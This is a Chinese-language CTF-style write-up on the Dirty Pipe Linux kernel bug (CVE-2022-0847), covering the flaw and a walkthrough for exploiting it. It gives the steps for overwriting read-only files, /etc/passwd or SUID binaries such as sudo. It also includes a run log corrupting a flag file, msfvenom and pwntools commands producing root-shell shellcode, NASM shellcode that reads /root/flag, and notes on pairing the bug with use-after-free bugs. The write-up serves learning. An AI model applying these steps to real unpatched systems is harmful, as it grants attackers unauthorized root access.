## 编译选项

- 本人选择 `linux-5.10.1` 内核版本
```txt
CONFIG_SLAB=y
CONFIG_E1000=y 
CONFIG_E1000E=y
```

## 原理

影响范围： 5.8 版本以上的内核均会收到该漏洞的影响，在 5.16.11、5.15.25、5.10.102 版本中才被修复

详情见[pdf](./CVE-2022-0847%20%20%20%20DirtyPipe.pdf)

1. pipe flags使用后没有清除
2. splice 0拷贝使用 pipe 传输。

## steps

1. 创建管道，读写一次，使其flag为 `PIPE_BUF_FLAG_CAN_MERGE`
2. splice 0拷贝，写入一个字节
3. 写入管道，由于flag的问题，写入之前的文件，造成**任意可读文件**的写

### how

1. 往可读文件中写入，比如 `/etc/passwd`
2. suid 文件写入 shellcode, 比如 `sudo` 命令

## exploit

1. 创建一个`/flag.txt` 并且设置为可读，看能否改写
2. 那写入 suid程序只需要把写的内容改成shellcode 就行。但是别忘了恢复内容。

编译

```bash
make
    [+] start dirtypipe_writeany
    clang -static  dirtypipe_writeany.c -o dirtypipe_writeany
    [+] end
    [+] start dirtypipe_suid
    clang -static  dirtypipe_suid.c -o dirtypipe_suid
    [+] end make 
```

打包环境，运行

```bash
[ctf@busybox]-[/home/ctf] 🤣 👉 ls
dirtypipe_writeany
[ctf@busybox]-[/home/ctf] 🤣 👉 cat /flag.txt
flag{what_A_mAg1c_cve}
[ctf@busybox]-[/home/ctf] 🤣 👉 ./dirtypipe_writeany /flag.txt 5 polluted
[+] get page size
[+] get and check args
[+] prepare pipe
[+] splice file
[+] write content to target file
[+] finish exploit!!
[ctf@busybox]-[/home/ctf] 🤣 👉 cat /flag.txt
flag{pollutedAg1c_cve}
```

**在使用时可能clang报错，修改Makefile**

```makefile
# change `CC := clang` to this
CC := gcc
```

### suid

**修改suid 程序，环境问题**
可以替换ubuntu的内核进行验证 或者 在自制文件系统直接覆写 `/bin/busybox` 其余文件都都是其link

#### 生成shellcode

最好是生成elf文件，并且相当小，能够写入

1. 使用msfvenom生成elf shellcode

```bash
$ msfvenom --list payloads | grep linux
# 这里找个exec
$ msfvenom -p linux/x64/exec --list-options
$ msfvenom -p linux/x64/exec CMD='/bin/sh' -f c  # -f 代表指定的文件格式
$ msfvenom -p linux/x64/exec CMD='/bin/sh'  -f elf > shell.elf
$ file shell.elf
shell.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

生成文件使用 syscall 的很小的 elf 文件

2. 使用 pwntools 生成 shellcode，需要将其二进制字节码打印出来, 但是其不是elf格式，直接覆盖会导致错误
- 但还是可以写，写入某个函数里，但是偏移计算需要结合二进制文件分析
- 比如说写 busybox 的 shutdown 函数地址是 0x49B5DA, 基地址 0x400000 因此偏移就是 0x9B5DA，直接写入这里。（看队内大佬的做法

```python
>>> shellcraft.amd64.linux.setuid(0)
>>> shellcraft.amd64.linux.setgid(0)
>>> shellcraft.amd64.linux.sh()
```

3. 需要结合 pwntools 写汇编文件（~~菜~~。nasm编译

```asm
; nasm -f elf64 shellcode.asm -o shellcode.o
; ld shellcode.o -o your_program

; open('/root/flag', 0)
; read(fd, buffer, 0x40)
; write(1, buffer, 0x40)

section .text
  global _start

_start:
  push 0x1010101 ^ 0x6761
  xor DWORD [rsp], 0x1010101
  mov rax, 0x6c662f746f6f722f
  push rax
  mov rdi, rsp
  xor edx, edx
  xor esi, esi
  push 2
  pop rax
  syscall
  mov edi, eax
  mov rsi, rsp
  mov rdx, 40h   ; read(open_fd, rsp, 0x40)
  xor rax, rax
  syscall
  mov eax, 1
  mov edi, 1
  syscall       ; write(1, rsp, 0x40)
```

## dirty pipe 在uaf 使用

可以改变 pipe 的flag，从而避免了 smep, smap, kpti 等保护的绕过。但是需要比较大的 heap size。victim heapsize 至少能包含2个`struct pipe_buffer`结构体 40 *2 = 80,也就是kmalloc-96大小的slab大小